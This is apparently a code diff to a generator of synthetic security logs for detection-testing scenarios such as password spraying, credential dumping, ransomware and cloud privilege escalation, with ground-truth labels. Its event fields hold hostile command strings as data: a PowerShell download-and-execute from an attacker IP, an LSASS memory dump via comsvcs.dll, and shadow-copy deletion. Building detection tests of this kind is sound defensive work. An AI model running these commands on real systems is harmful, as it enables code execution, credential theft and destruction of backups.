@@ -1,13 +1,8 @@
-import base64
-import time
-import datetime
-import uuid
-import random
-from typing import Dict, Any, List, Optional, Tuple
-from app.coordination.context import ScenarioContext, build_scenario_context
+from typing import Dict, Any, List, Tuple
+from app.coordination.context import ScenarioContext
 from app.coordination.timeline import TimelineManager
 from app.coordination.registry import ScenarioDefinition, scenario_registry
-from app.registry.entities import USERS, DEVICES, SUSPICIOUS_EXTERNAL_IPS, NORMAL_EXTERNAL_IPS
+from app.registry.entities import users, resolve_device, tenant
 from app.generators.entra import (
     generate_entra_signin_event,
     generate_entra_directory_audit_event
@@ -44,7 +39,7 @@ def scenario_password_spraying(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
     events: List[Tuple[Dict[str, Any], str]] = []
     
     # Spray 4 different employee accounts with failures
-    test_users = USERS[:4]
+    test_users = users()[:4]
     for idx, u in enumerate(test_users):
         t = timeline.get_time_at_offset(offset_seconds=idx * 8.0)
         events.append((
@@ -59,7 +54,6 @@ def scenario_password_spraying(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
                 city="Kyiv",
                 country="UA",
                 mfa_required=True,
-                scenario_id=ctx.scenario_id,
                 event_time=t
             ),
             "Microsoft Entra ID"
@@ -79,7 +73,6 @@ def scenario_password_spraying(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
             city="Kyiv",
             country="UA",
             mfa_required=False,
-            scenario_id=ctx.scenario_id,
             event_time=t_succ
         ),
         "Microsoft Entra ID"
@@ -104,7 +97,6 @@ def scenario_account_brute_force(ctx: ScenarioContext) -> List[Tuple[Dict[str, A
                 error_code=50126,
                 failure_reason="Invalid username or password",
                 risk_level="high",
-                scenario_id=ctx.scenario_id,
                 event_time=t
             ),
             "Microsoft Entra ID"
@@ -119,7 +111,6 @@ def scenario_account_brute_force(ctx: ScenarioContext) -> List[Tuple[Dict[str, A
             source_ip=ctx.attacker_ip,
             is_success=True,
             logon_type=10,
-            scenario_id=ctx.scenario_id,
             event_time=t_win
         ),
         "Windows Event Logs"
@@ -137,13 +128,12 @@ def scenario_impossible_travel(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
     events.append((
         generate_entra_signin_event(
             user_principal_name=upn,
-            ip_address="198.51.100.14",
+            ip_address=tenant()["egress_ip"],
             app_display_name="Microsoft 365",
             is_success=True,
             risk_level="none",
             city="New York",
             country="US",
-            scenario_id=ctx.scenario_id,
             event_time=t1
         ),
         "Microsoft Entra ID"
@@ -160,7 +150,6 @@ def scenario_impossible_travel(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
             risk_level="high",
             city="Frankfurt",
             country="DE",
-            scenario_id=ctx.scenario_id,
             event_time=t2
         ),
         "Microsoft Entra ID"
@@ -186,7 +175,6 @@ def scenario_mfa_fatigue(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str
                 failure_reason="Authentication failed during strong authentication request",
                 risk_level="high",
                 mfa_required=True,
-                scenario_id=ctx.scenario_id,
                 event_time=t
             ),
             "Microsoft Entra ID"
@@ -203,7 +191,6 @@ def scenario_mfa_fatigue(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str
             error_code=0,
             risk_level="medium",
             mfa_required=True,
-            scenario_id=ctx.scenario_id,
             event_time=t_approved
         ),
         "Microsoft Entra ID"
@@ -233,7 +220,6 @@ def scenario_powershell_abuse(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any]
             parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
             parent_command_line="WINWORD.EXE /n C:\\Users\\Downloads\\Invoice.docm",
             process_id=4820,
-            scenario_id=ctx.scenario_id,
             event_time=t1
         ),
         "Windows Event Logs"
@@ -247,7 +233,6 @@ def scenario_powershell_abuse(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any]
             user_name=user,
             script_text=f"IEX (New-Object Net.WebClient).DownloadString('http://{ctx.attacker_ip}:8080/stage1.ps1'); Invoke-ReflectivePEInjection",
             is_suspicious=True,
-            scenario_id=ctx.scenario_id,
             event_time=t2
         ),
         "Windows Event Logs"
@@ -263,7 +248,7 @@ def scenario_powershell_abuse(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any]
             process_command_line=encoded_cmd,
             parent_process_name="WINWORD.EXE",
             action_type="ProcessCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t3
         ),
         "Microsoft Defender"
     ))
@@ -287,7 +272,7 @@ def scenario_credential_dumping(ctx: ScenarioContext) -> List[Tuple[Dict[str, An
             process_command_line=rundll_cmd,
             parent_process_name="powershell.exe",
             action_type="ProcessCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t1
         ),
         "Microsoft Defender"
     ))
@@ -301,7 +286,7 @@ def scenario_credential_dumping(ctx: ScenarioContext) -> List[Tuple[Dict[str, An
             file_name="lsass.dmp",
             folder_path="C:\\Temp\\",
             action_type="FileCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t2
         ),
         "Microsoft Defender"
     ))
@@ -324,7 +309,7 @@ def scenario_ransomware_canary(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
                 file_name=fname,
                 folder_path="C:\\Users\\Documents\\",
                 action_type="FileModified",
-                scenario_id=ctx.scenario_id
+                event_time=t
             ),
             "Microsoft Defender"
         ))
@@ -339,7 +324,7 @@ def scenario_ransomware_canary(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
             process_command_line="vssadmin.exe delete shadows /all /quiet",
             parent_process_name="svchost_update.exe",
             action_type="ProcessCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t_alert
         ),
         "Microsoft Defender"
     ))
@@ -364,7 +349,6 @@ def scenario_persistence_task(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any]
             parent_image="C:\\Windows\\System32\\cmd.exe",
             parent_command_line="cmd.exe /c install.bat",
             process_id=5912,
-            scenario_id=ctx.scenario_id,
             event_time=t1
         ),
         "Windows Event Logs"
@@ -380,7 +364,7 @@ def scenario_persistence_task(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any]
             process_command_line=schtasks_cmd,
             parent_process_name="cmd.exe",
             action_type="ProcessCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t2
         ),
         "Microsoft Defender"
     ))
@@ -399,7 +383,6 @@ def scenario_c2_beaconing(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], st
     t1 = timeline.get_time_at_offset(offset_seconds=0.0)
     events.append((
         generate_firewall_cef_event(
-            device_name="FW-01",
             signature_id="8001",
             name="Outbound connection",
             severity=5,
@@ -412,7 +395,6 @@ def scenario_c2_beaconing(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], st
             direction="outbound",
             application="ssl",
             user=ctx.target_user["local_account"],
-            scenario_id=ctx.scenario_id,
             event_time=t1
         ),
         "Firewall logs"
@@ -422,14 +404,12 @@ def scenario_c2_beaconing(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], st
     t2 = timeline.get_time_at_offset(offset_seconds=0.8)
     events.append((
         generate_firewall_threat_event(
-            device_name="FW-01",
             source_ip=ctx.internal_ip,
             destination_ip=ctx.attacker_ip,
             destination_port=443,
             threat_name="Suspicious TLS destination",
             action="alert",
             user=ctx.target_user["local_account"],
-            scenario_id=ctx.scenario_id,
             event_time=t2
         ),
         "Firewall logs"
@@ -447,18 +427,16 @@ def scenario_port_scan(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]
         t = timeline.get_time_at_offset(offset_seconds=idx * 2.0)
         events.append((
             generate_firewall_cef_event(
-                device_name="FW-01",
                 signature_id="3001",
                 name="Traffic Dropped by Policy",
                 severity=4,
                 source_ip=ctx.internal_ip,
-                destination_ip=f"10.0.1.{50 + idx}",
+                destination_ip=f"{ctx.internal_ip.rsplit('.', 1)[0]}.{50 + idx}",
                 destination_port=port,
                 protocol="TCP",
                 action="deny",
                 rule_name="Default-Interzone-Deny",
                 direction="inbound",
-                scenario_id=ctx.scenario_id,
                 event_time=t
             ),
             "Firewall logs"
@@ -474,7 +452,6 @@ def scenario_data_exfiltration(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
     t = timeline.get_time_at_offset(offset_seconds=0.0)
     events.append((
         generate_firewall_cef_event(
-            device_name="FW-01",
             signature_id="8001",
             name="Outbound High Volume Transfer",
             severity=7,
@@ -489,7 +466,6 @@ def scenario_data_exfiltration(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
             bytes_in=10240,
             application="ssl",
             user=ctx.target_user["local_account"],
-            scenario_id=ctx.scenario_id,
             event_time=t
         ),
         "Firewall logs"
@@ -512,7 +488,6 @@ def scenario_iam_privilege_escalation(ctx: ScenarioContext) -> List[Tuple[Dict[s
             user_name=ctx.target_user["username"],
             source_ip=ctx.attacker_ip,
             policy_arn="arn:aws:iam::aws:policy/AdministratorAccess",
-            scenario_id=ctx.scenario_id,
             event_time=t
         ),
         "AWS CloudTrail"
@@ -529,7 +504,6 @@ def scenario_logging_evasion(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any],
         generate_cloudtrail_stop_logging_event(
             user_name=ctx.target_user["username"],
             source_ip=ctx.attacker_ip,
-            scenario_id=ctx.scenario_id,
             event_time=t
         ),
         "AWS CloudTrail"
@@ -556,7 +530,6 @@ def scenario_s3_data_exfiltration(ctx: ScenarioContext) -> List[Tuple[Dict[str, 
                 },
                 response_elements={"bytesTransferred": 45291040},
                 read_only=True,
-                scenario_id=ctx.scenario_id,
                 event_time=t
             ),
             "AWS CloudTrail"
@@ -583,7 +556,6 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             ip_address=ctx.attacker_ip,
             is_success=False,
             error_code=50126,
-            scenario_id=ctx.scenario_id,
             event_time=t1
         ),
         "Microsoft Entra ID"
@@ -595,7 +567,6 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             ip_address=ctx.attacker_ip,
             is_success=True,
             risk_level="high",
-            scenario_id=ctx.scenario_id,
             event_time=t2
         ),
         "Microsoft Entra ID"
@@ -609,7 +580,6 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             user_name=account,
             source_ip=ctx.attacker_ip,
             is_success=True,
-            scenario_id=ctx.scenario_id,
             event_time=t3
         ),
         "Windows Event Logs"
@@ -621,7 +591,6 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             user_name=account,
             script_text=f"IEX (New-Object Net.WebClient).DownloadString('https://{ctx.attacker_ip}/stage1.ps1')",
             is_suspicious=True,
-            scenario_id=ctx.scenario_id,
             event_time=t4
         ),
         "Windows Event Logs"
@@ -637,7 +606,7 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             process_command_line="powershell.exe -NoProfile -enc VwByAGkAdABl...",
             parent_process_name="WINWORD.EXE",
             action_type="ProcessCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t5
         ),
         "Microsoft Defender"
     ))
@@ -646,12 +615,10 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
     t6 = timeline.get_time_at_offset(offset_seconds=50.0)
     events.append((
         generate_firewall_threat_event(
-            device_name="FW-01",
             source_ip=ctx.internal_ip,
             destination_ip=ctx.attacker_ip,
             threat_name="Suspicious TLS destination",
             user=account,
-            scenario_id=ctx.scenario_id,
             event_time=t6
         ),
         "Firewall logs"
@@ -665,7 +632,6 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             ip_address=ctx.attacker_ip,
             activity_name="Add member to role",
             role_name="Privileged Role Administrator",
-            scenario_id=ctx.scenario_id,
             event_time=t7
         ),
         "Microsoft Entra ID"
@@ -678,7 +644,6 @@ def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             user_name=ctx.target_user["username"],
             source_ip=ctx.attacker_ip,
             policy_arn="arn:aws:iam::aws:policy/AdministratorAccess",
-            scenario_id=ctx.scenario_id,
             event_time=t8
         ),
         "AWS CloudTrail"
@@ -690,7 +655,7 @@ def scenario_attack_chain_b(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
     timeline = TimelineManager()
     events: List[Tuple[Dict[str, Any], str]] = []
     dev_ws = ctx.target_device["device_name"]
-    dev_srv = "FINANCE-SRV-01"
+    dev_srv = resolve_device("FINANCE-SRV-01")["device_name"]
     user = ctx.target_user["local_account"]
 
     # 1. Credential dumping on workstation
@@ -702,7 +667,7 @@ def scenario_attack_chain_b(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             process_name="rundll32.exe",
             process_command_line="rundll32.exe comsvcs.dll, MiniDump lsass.dmp",
             action_type="ProcessCreated",
-            scenario_id=ctx.scenario_id
+            event_time=t1
         ),
         "Microsoft Defender"
     ))
@@ -716,7 +681,6 @@ def scenario_attack_chain_b(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             source_ip=ctx.internal_ip,
             is_success=True,
             logon_type=10,
-            scenario_id=ctx.scenario_id,
             event_time=t2
         ),
         "Windows Event Logs"
@@ -731,7 +695,7 @@ def scenario_attack_chain_b(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], 
             file_name="Production_Ledger.db.locked",
             folder_path="D:\\Database\\",
             action_type="FileModified",
-            scenario_id=ctx.scenario_id
+            event_time=t3
         ),
         "Microsoft Defender"
     ))
@@ -745,18 +709,17 @@ def scenario_admin_maintenance(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
     """SCN-FP-01: Authorized IT Administrator Maintenance Window (CR-8821 lookalike)."""
     timeline = TimelineManager()
     events: List[Tuple[Dict[str, Any], str]] = []
-    admin_user = USERS[2]  # Michael Anderson (IT Admin)
+    admin_user = users()[2]  # IT administrator (Michael Anderson at Acme)
 
     # 1. Sign-in from corporate branch
     t1 = timeline.get_time_at_offset(offset_seconds=0.0)
     events.append((
         generate_entra_signin_event(
             user_principal_name=admin_user["email"],
-            ip_address="198.51.100.14",
+            ip_address=tenant()["egress_ip"],
             app_display_name="Windows Admin Center",
             is_success=True,
             risk_level="none",
-            scenario_id=ctx.scenario_id,
             event_time=t1
         ),
         "Microsoft Entra ID"
@@ -766,11 +729,10 @@ def scenario_admin_maintenance(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any
     t2 = timeline.get_time_at_offset(offset_seconds=15.0)
     events.append((
         generate_powershell_script_block_event(
-            device_name="IT-ADMIN-01",
-            user_name="admin_manderson",
+            device_name=admin_user["assigned_device"],
+            user_name=admin_user["sam"],
             script_text="# Change Window CR-8821: Monthly Patch Verification\nGet-Service | Where-Object {$_.Status -eq 'Running'}; Restart-Service W32Time",
             is_suspicious=False,
-            scenario_id=ctx.scenario_id,
             event_time=t2
         ),
         "Windows Event Logs"
@@ -781,14 +743,13 @@ def scenario_vuln_scanner(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], st
     """SCN-FP-02: Approved Vulnerability Scanner Sweeping Subnet."""
     timeline = TimelineManager()
     events: List[Tuple[Dict[str, Any], str]] = []
-    scanner_ip = "10.0.1.15"  # Approved scanner host
+    scanner_ip = resolve_device("IT-ADMIN-01")["ip_address"]  # Approved scanner host
 
     # Firewall observes routine port sweep
     for idx, port in enumerate([80, 443, 8080]):
         t = timeline.get_time_at_offset(offset_seconds=idx * 1.5)
         events.append((
             generate_firewall_cef_event(
-                device_name="FW-01",
                 signature_id="8001",
                 name="Approved Scanner Probe",
                 severity=1,
@@ -797,7 +758,6 @@ def scenario_vuln_scanner(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], st
                 destination_port=port,
                 action="allow",
                 rule_name="Internal-Security-Audit",
-                scenario_id=ctx.scenario_id,
                 event_time=t
             ),
             "Firewall logs"
@@ -818,7 +778,6 @@ def scenario_duplicate_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str, A
         account_name=ctx.target_user["local_account"],
         process_name="powershell.exe",
         process_command_line="powershell.exe -NoProfile -enc SQBFAFgA",
-        scenario_id=ctx.scenario_id
     )
     events.append((def_event, "Microsoft Defender"))
     # Duplicate record with identical natural dedupe key
@@ -829,7 +788,6 @@ def scenario_duplicate_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str, A
         user_principal_name=ctx.target_user["email"],
         ip_address=ctx.attacker_ip,
         is_success=True,
-        scenario_id=ctx.scenario_id
     )
     events.append((entra_event, "Microsoft Entra ID"))
     # Duplicate Entra ID record
@@ -849,7 +807,6 @@ def scenario_out_of_order_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str
             user_name=ctx.target_user["local_account"],
             source_ip="127.0.0.1",
             is_success=True,
-            scenario_id=ctx.scenario_id,
             event_time=t_present
         ),
         "Windows Event Logs"
@@ -859,7 +816,6 @@ def scenario_out_of_order_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str
     t_delayed = timeline.get_out_of_order_time(negative_offset_seconds=240.0)
     events.append((
         generate_firewall_cef_event(
-            device_name="FW-01",
             signature_id="8001",
             name="Delayed Outbound Traffic Record",
             severity=1,
@@ -867,7 +823,6 @@ def scenario_out_of_order_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str
             destination_ip=ctx.normal_ip,
             destination_port=443,
             action="allow",
-            scenario_id=ctx.scenario_id,
             event_time=t_delayed
         ),
         "Firewall logs"
@@ -1134,28 +1089,57 @@ SCENARIOS_DEFINITIONS: List[ScenarioDefinition] = [
     )
 ]
 
+# Ground-truth labels per scenario (06_ground_truth_labels.schema.json enums):
+# scenario_type, label, expected_verdict. Kept out of the events themselves.
+SCENARIO_TRUTH = {
+    "SCN-ID-01": ("password_spray", "malicious", "true_positive"),
+    "SCN-ID-02": ("account_compromise", "malicious", "true_positive"),
+    "SCN-ID-03": ("impossible_travel", "malicious", "true_positive"),
+    "SCN-ID-04": ("mfa_fatigue", "malicious", "true_positive"),
+    "SCN-EP-01": ("malware_execution", "malicious", "true_positive"),
+    "SCN-EP-02": ("malware_execution", "malicious", "true_positive"),
+    "SCN-EP-03": ("ransomware", "malicious", "true_positive"),
+    "SCN-EP-04": ("malware_execution", "malicious", "true_positive"),
+    "SCN-NW-01": ("malware_execution", "malicious", "true_positive"),
+    "SCN-NW-02": ("lateral_movement", "malicious", "true_positive"),
+    "SCN-NW-03": ("data_exfiltration", "malicious", "true_positive"),
+    "SCN-CL-01": ("cloud_privilege_escalation", "malicious", "true_positive"),
+    "SCN-CL-02": ("defense_evasion", "malicious", "true_positive"),
+    "SCN-CL-03": ("data_exfiltration", "malicious", "true_positive"),
+    "SCN-CH-01": ("account_compromise", "malicious", "true_positive"),
+    "SCN-CH-02": ("ransomware", "malicious", "true_positive"),
+    "SCN-FP-01": ("authorized_admin_change", "benign_true_positive", "benign_true_positive"),
+    "SCN-FP-02": ("vulnerability_scan", "benign_lookalike", "false_positive"),
+    "SCN-DQ-01": ("baseline", "benign", "not_applicable"),
+    "SCN-DQ-02": ("baseline", "benign", "not_applicable"),
+}
+
 # Register all 20 into the registry singleton
 for s_def in SCENARIOS_DEFINITIONS:
+    s_def.scenario_type, s_def.label, s_def.expected_verdict = SCENARIO_TRUTH[s_def.scenario_id]
     scenario_registry.register(s_def)
 
-# Legacy helper with strict lookup
+# Legacy aliases kept for older callers (e.g. SCN-001 = the full attack chain)
+LEGACY_IDS = {
+    "SCN-001": "SCN-CH-01",
+    "SCN-TARGETED-001": "SCN-CH-01",
+    "SCN-002": "SCN-FP-01",
+    "SCN-BENIGN-002": "SCN-FP-01",
+    "SCN-003": "SCN-DQ-01",
+    "SCN-DUPLICATES-003": "SCN-DQ-01",
+    "SCN-004": "SCN-NW-02",
+    "SCN-INCONCLUSIVE-004": "SCN-NW-02"
+}
+
+def resolve_scenario_id(scenario_id: str) -> str:
+    sid = scenario_id.upper().strip()
+    return LEGACY_IDS.get(sid, sid)
+
 def get_scenario_by_id(scenario_id: str) -> List[Tuple[Dict[str, Any], str]]:
     """
-    Retrieves events for scenario by ID with strict lookup.
+    Generates a scenario's (event, source) steps without scheduling them (used by schema validation).
     """
-    # Legacy aliases
-    sid_map = {
-        "SCN-001": "SCN-CH-01",
-        "SCN-TARGETED-001": "SCN-CH-01",
-        "SCN-002": "SCN-FP-01",
-        "SCN-BENIGN-002": "SCN-FP-01",
-        "SCN-003": "SCN-DQ-01",
-        "SCN-DUPLICATES-003": "SCN-DQ-01",
-        "SCN-004": "SCN-NW-02",
-        "SCN-INCONCLUSIVE-004": "SCN-NW-02"
-    }
-    resolved_id = sid_map.get(scenario_id.upper().strip(), scenario_id.upper().strip())
-    return scenario_registry.execute_scenario(resolved_id)
+    return scenario_registry.execute_scenario(resolve_scenario_id(scenario_id))
 
 def build_targeted_attack_scenario() -> List[Tuple[Dict[str, Any], str]]:
     return get_scenario_by_id("SCN-001")
